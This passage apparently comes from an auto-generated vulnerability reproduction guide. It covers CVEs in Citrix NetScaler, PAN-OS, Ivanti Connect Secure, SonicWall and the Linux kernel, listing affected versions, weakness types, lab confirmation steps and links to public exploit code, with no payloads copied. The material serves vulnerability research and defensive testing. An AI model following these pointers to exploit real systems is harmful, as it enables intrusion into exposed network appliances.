- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/173997/Citrix-ADC-NetScaler-Remote-Code-Execution.html

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2023-4966

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: citrix netscaler_application_delivery_controller >= 12.1, < 12.1-55.300; citrix netscaler_application_delivery_controller >= 13.0, < 13.0-92.19; citrix netscaler_application_delivery_controller >= 13.1, < 13.1-37.164. NVD lists 8 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-4966)]
- Weakness: CWE-119. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-4966)]

### Input / trigger
- NVD characterizes the trigger as information disclosure. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-4966)] [[poc-in-github](https://github.com/Chocapikk/CVE-2023-4966)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as information disclosure. Structured affected range: citrix netscaler_application_delivery_controller >= 12.1, < 12.1-55.300. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-4966)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-4966)] [[poc-in-github](https://github.com/Chocapikk/CVE-2023-4966)]

### Public PoC (if any)
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/Chocapikk/CVE-2023-4966
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2023/CVE-2023-4966.json

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2024-3400

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: paloaltonetworks pan-os 10.2.0; paloaltonetworks pan-os 10.2.1; paloaltonetworks pan-os 10.2.2. NVD lists 18 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-3400)]
- Weakness: CWE-20, CWE-77. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-3400)]

### Input / trigger
- NVD characterizes the trigger as arbitrary code. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-3400)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux_x86-64/remote/51996.txt)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as arbitrary code. Structured affected range: paloaltonetworks pan-os 10.2.0. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-3400)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-3400)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux_x86-64/remote/51996.txt)]

### Public PoC (if any)
- EDB-51996 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux_x86-64/remote/51996.txt
- GHSA-listed: https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-3400
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/h4x0r-dz/CVE-2024-3400
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2024/CVE-2024-3400.json
- NVD Exploit-tagged reference: https://unit42.paloaltonetworks.com/cve-2024-3400/
- NVD Exploit-tagged reference: https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2019-11510

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: ivanti connect_secure 8.2; ivanti connect_secure 8.3; ivanti connect_secure 9.0. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-11510)]
- Weakness: CWE-22. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-11510)]

### Input / trigger
- No concrete request string is stated in the cited advisory text. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-11510)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/47297.rb)]

### Expected (patched) vs vulnerable behavior
- See the public record (abstract only). No concrete vulnerable-versus-patched behavior was copied from the advisory. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-11510)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-11510)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/47297.rb)]

### Public PoC (if any)
- EDB-47297 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/47297.rb
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-11510
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/projectzeroindia/CVE-2019-11510
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2019/CVE-2019-11510.json
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/154176/Pulse-Secure-SSL-VPN-8.1R15.1-8.2-8.3-9.0-Arbitrary-File-Disclosure.html
- NVD Exploit-tagged reference: https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2021-22893

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: ivanti connect_secure 9.0; ivanti connect_secure 9.1. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-22893)]
- Weakness: CWE-287, CWE-416. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-22893)]

### Input / trigger
- NVD characterizes the trigger as arbitrary code execution. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-22893)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2021-22893)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as arbitrary code execution. Structured affected range: ivanti connect_secure 9.0. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-22893)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-22893)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2021-22893)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2021-22893
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/ZephrFish/CVE-2021-22893_HoneyPoC2
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2021/CVE-2021-22893.json

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2024-21887

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: ivanti connect_secure 9.0; ivanti connect_secure 9.1; ivanti connect_secure 22.1. NVD lists 16 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-21887)]
- Weakness: CWE-77. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-21887)]

### Input / trigger
- NVD characterizes the trigger as command injection. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-21887)] [[nvd](http://packetstormsecurity.com/files/176668/Ivanti-Connect-Secure-Unauthenticated-Remote-Code-Execution.html)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as command injection. Structured affected range: ivanti connect_secure 9.0. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-21887)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-21887)] [[nvd](http://packetstormsecurity.com/files/176668/Ivanti-Connect-Secure-Unauthenticated-Remote-Code-Execution.html)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-21887
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/Chocapikk/CVE-2024-21887
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2024/CVE-2024-21887.json
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/176668/Ivanti-Connect-Secure-Unauthenticated-Remote-Code-Execution.html

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2024-46805

> Status: `repro: partial` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: linux linux_kernel < 5.15.167; linux linux_kernel >= 5.16, < 6.1.109; linux linux_kernel >= 6.2, < 6.6.50. NVD lists 4 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-46805)]
- Weakness: CWE-476. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-46805)]

### Input / trigger
- The advisory describes the condition in prose. No concrete request was copied, and none was invented. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-46805)]

### Expected (patched) vs vulnerable behavior
- See the public record (abstract only). No concrete vulnerable-versus-patched behavior was copied from the advisory. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-46805)]

### How to confirm
- Not possible from public sources beyond the affected-versus-patched range above. No concrete input was published, so none was invented. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-46805)]

### Public PoC (if any)
- None found.

### What's missing
- No public PoC (ExploitDB / PoC-in-GitHub / NVD Exploit-tagged refs / GHSA PoC refs empty).
- No concrete request or payload in the cited advisories. None was invented.

## Steps to reproduce — CVE-2021-20016

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: sonicwall sma_100_firmware >= 10.0.0.0, < 10.2.0.5-d-29sv; sonicwall sma_200_firmware; sonicwall sma_210_firmware. NVD lists 6 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-20016)]
- Weakness: CWE-89. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-20016)]

### Input / trigger
- No concrete request string is stated in the cited advisory text. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-20016)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2021-20016)]

### Expected (patched) vs vulnerable behavior
- See the public record (abstract only). No concrete vulnerable-versus-patched behavior was copied from the advisory. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-20016)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-20016)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2021-20016)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2021-20016

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2024-40766

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: sonicwall sonicos < 5.9.2.14-13o; sonicwall sonicos < 6.5.2.8-2n; sonicwall sonicos < 6.5.4.15.116n. NVD lists 4 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-40766)]
- Weakness: CWE-284. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-40766)]

### Input / trigger
- No concrete request string is stated in the cited advisory text. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-40766)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-40766)]

### Expected (patched) vs vulnerable behavior
- See the public record (abstract only). No concrete vulnerable-versus-patched behavior was copied from the advisory. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-40766)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-40766)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-40766)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-40766

### What's missing
- (none for verified-public)
<!-- bughive-repro-end -->
